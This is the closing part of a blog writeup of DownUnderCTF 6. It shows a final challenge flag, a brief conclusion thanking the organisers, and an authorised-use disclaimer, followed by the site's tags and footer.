**Flag:** `DUCTF{.*#--BosMutusOfTheTibetanPlateau--#*.}`

<a href="/assets/img/posts/DUCTF/aws.gif"
class="popup img-link shimmer"><img
src="/assets/img/posts/DUCTF/aws.gif" loading="lazy" alt="aws" /></a>

------------------------------------------------------------------------

## <span class="me-2">Conclusion</span><a href="#conclusion" class="anchor text-muted"><em></em></a>

DownUnderCTF 6 provided excellent challenges across all categories,
offering great learning opportunities from basic web exploitation to
advanced AI and reverse engineering problems. The competition
highlighted the importance of having a diverse toolkit and adapting
quickly to different challenge types.

Special thanks to the DownUnderCTF organizers for putting together such
a well-crafted competition!

Stay tuned for more CTF writeups and happy hacking! 🚀

------------------------------------------------------------------------

*Disclaimer: This writeup is for educational purposes only. Always
ensure you have proper authorization before testing on any systems. All
techniques described should only be used in legal, ethical contexts such
as authorized penetration testing or CTF competitions.*

</div>

<div class="post-tail-wrapper text-muted">

<div class="post-meta mb-3">

[CTF](/categories/ctf/), [DownUnderCTF](/categories/downunderctf/)

</div>

<div class="post-tags">

<a href="/tags/downunderctf/"
class="post-tag no-text-decoration">downunderctf</a>
<a href="/tags/web/" class="post-tag no-text-decoration">web</a>
<a href="/tags/pwn/" class="post-tag no-text-decoration">pwn</a>
<a href="/tags/crypto/" class="post-tag no-text-decoration">crypto</a>
<a href="/tags/rev/" class="post-tag no-text-decoration">rev</a>
<a href="/tags/ai/" class="post-tag no-text-decoration">ai</a>
<a href="/tags/osint/" class="post-tag no-text-decoration">osint</a>
<a href="/tags/misc/" class="post-tag no-text-decoration">misc</a>
<a href="/tags/ctf/" class="post-tag no-text-decoration">ctf</a>
<a href="/tags/writeup/" class="post-tag no-text-decoration">writeup</a>

</div>

<div class="post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2">

<div class="license-wrapper">

This post is licensed under [CC BY
4.0](https://creativecommons.org/licenses/by/4.0/) by the author.

</div>

<div class="share-wrapper d-flex align-items-center">

<span class="share-label text-muted">Share</span>

<a
href="https://twitter.com/intent/tweet?text=DownUnderCTF%206%20Complete%20Writeup%20-%20All%20Categories%20-%20K4YR0&#39;s%20Security%20Blog&amp;url=https%3A%2F%2Fk4yr0.github.io%2F%2Fposts%2Fdownunderctf6-writeup%2F"
target="_blank" rel="noopener" data-bs-toggle="tooltip"
data-bs-placement="top" aria-label="Twitter"
title="Twitter"><em></em></a> <a
href="https://www.facebook.com/sharer/sharer.php?title=DownUnderCTF%206%20Complete%20Writeup%20-%20All%20Categories%20-%20K4YR0&#39;s%20Security%20Blog&amp;u=https%3A%2F%2Fk4yr0.github.io%2F%2Fposts%2Fdownunderctf6-writeup%2F"
target="_blank" rel="noopener" data-bs-toggle="tooltip"
data-bs-placement="top" aria-label="Facebook"
title="Facebook"><em></em></a> <a
href="https://t.me/share/url?url=https%3A%2F%2Fk4yr0.github.io%2F%2Fposts%2Fdownunderctf6-writeup%2F&amp;text=DownUnderCTF%206%20Complete%20Writeup%20-%20All%20Categories%20-%20K4YR0&#39;s%20Security%20Blog"
target="_blank" rel="noopener" data-bs-toggle="tooltip"
data-bs-placement="top" aria-label="Telegram"
title="Telegram"><em></em></a>

</div>

</div>

</div>

</div>

<div class="access">

<div id="access-lastmod" class="section">

## Recently Updated

- [DownUnderCTF 6 Complete Writeup - All
  Categories](/posts/downunderctf6-writeup/)
- [File Descriptor Leak via /dev/fd - A Linux Privilege Escalation
  Technique](/posts/file-descriptor-leak/)

</div>

<div class="section">

## Trending Tags

<div class="d-flex flex-wrap mt-3 mb-1 me-3">

<a href="/tags/dev-fd/"
class="post-tag btn btn-outline-primary">/dev/fd</a>
<a href="/tags/ai/" class="post-tag btn btn-outline-primary">ai</a>
<a href="/tags/crypto/"
class="post-tag btn btn-outline-primary">crypto</a>
<a href="/tags/ctf/" class="post-tag btn btn-outline-primary">ctf</a>
<a href="/tags/downunderctf/"
class="post-tag btn btn-outline-primary">downunderctf</a>
<a href="/tags/file-descriptors/"
class="post-tag btn btn-outline-primary">file-descriptors</a>
<a href="/tags/linux/"
class="post-tag btn btn-outline-primary">linux</a>
<a href="/tags/misc/" class="post-tag btn btn-outline-primary">misc</a>
<a href="/tags/osint/"
class="post-tag btn btn-outline-primary">osint</a>
<a href="/tags/pentest/"
class="post-tag btn btn-outline-primary">pentest</a>

</div>

</div>

</div>

<div class="toc-border-cover z-3">

</div>

<div id="toc-wrapper"
class="section invisible position-sticky ps-0 pe-4 pb-4">

## Contents

</div>

</div>

<div class="row">

<div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">

<a href="/posts/file-descriptor-leak/" class="btn btn-outline-primary"
aria-label="Older"></a>

File Descriptor Leak via /dev/fd - A Linux Privilege Escalation
Technique

<div class="btn btn-outline-primary disabled" aria-label="Newer">

\-

</div>

© 2025 [K4YR0](https://x.com/K4YR0x64). <span bs-toggle="tooltip"
bs-placement="top"
title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some
rights reserved.</span>

Using the <a href="https://github.com/cotes2020/jekyll-theme-chirpy"
data-bs-toggle="tooltip" data-bs-placement="top" target="_blank"
rel="noopener" title="v7.3.0">Chirpy</a> theme for
<a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.

</div>

</div>

<div id="search-result-wrapper"
class="d-flex justify-content-center d-none">

<div class="col-11 content">

<div id="search-hints">

<div class="section">

## Trending Tags

<div class="d-flex flex-wrap mt-3 mb-1 me-3">

<a href="/tags/dev-fd/"
class="post-tag btn btn-outline-primary">/dev/fd</a>
<a href="/tags/ai/" class="post-tag btn btn-outline-primary">ai</a>
<a href="/tags/crypto/"
class="post-tag btn btn-outline-primary">crypto</a>
<a href="/tags/ctf/" class="post-tag btn btn-outline-primary">ctf</a>
<a href="/tags/downunderctf/"
class="post-tag btn btn-outline-primary">downunderctf</a>
<a href="/tags/file-descriptors/"
class="post-tag btn btn-outline-primary">file-descriptors</a>
<a href="/tags/linux/"
class="post-tag btn btn-outline-primary">linux</a>
<a href="/tags/misc/" class="post-tag btn btn-outline-primary">misc</a>
<a href="/tags/osint/"
class="post-tag btn btn-outline-primary">osint</a>
<a href="/tags/pentest/"
class="post-tag btn btn-outline-primary">pentest</a>

</div>

</div>

</div>

<div id="search-results"
class="d-flex flex-wrap justify-content-center text-muted mt-3">

</div>

</div>

</div>

</div>

</div>

<div id="mask" class="d-none position-fixed w-100 h-100 z-1">

</div>

<div class="toast-header">

</div>

<div class="toast-body text-center pt-0">

A new version of content is available.

Update

</div>
